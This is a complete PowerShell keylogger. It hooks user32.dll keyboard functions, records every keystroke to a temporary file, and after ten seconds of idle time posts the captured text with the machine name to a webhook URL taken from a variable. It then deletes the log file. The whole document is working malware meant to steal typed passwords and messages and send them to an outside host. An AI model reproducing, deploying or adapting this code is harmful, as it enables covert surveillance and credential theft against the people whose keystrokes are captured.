$hookurl = "$dc"

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Add Definitions and save file
$logPath = "$env:temp/t.txt"
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$no = New-Item -Path $logPath -ItemType File -Force
$fileContent = Get-Content -Path $logPath -Raw

# Add stopwatch for intellegent sending
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Start a continuous loop
While ($true){
$keyPressed = $false
try{

# Start a loop that checks the time since last activity before message is sent
while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {

# Start the loop with 30 ms delay between keystate check
Start-Sleep -Milliseconds 30
for ($asc = 9; $asc -le 254; $asc++){

# Get the key state. (is any key currently pressed)
$keyst = $API::GetAsyncKeyState($asc)

# If a key is pressed
if ($keyst -eq -32767) {

# Restart the inactivity timer
$keyPressed = $true
$LastKeypressTime.Restart()
$null = [console]::CapsLock

# Translate the keycode to a letter
$vtkey = $API::MapVirtualKey($asc, 3)

# Get the keyboard state and create stringbuilder
$kbst = New-Object Byte[] 256
$checkkbst = $API::GetKeyboardState($kbst)
$logchar = New-Object -TypeName System.Text.StringBuilder

# Define the key that was pressed          
if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) 
{
# Add the key to the file
[System.IO.File]::AppendAllText($logPath, $logchar, [System.Text.Encoding]::Unicode) 
}}}}}
finally{
If ($keyPressed) {
# Send the saved keys to a webhook
$fileContent = Get-Content -Path $logPath -Raw
$escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

#Remove log file and reset inactivity check 
Remove-Item -Path $logPath -Force
$keyPressed = $false
}}
# reset stopwatch before restarting the loop
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
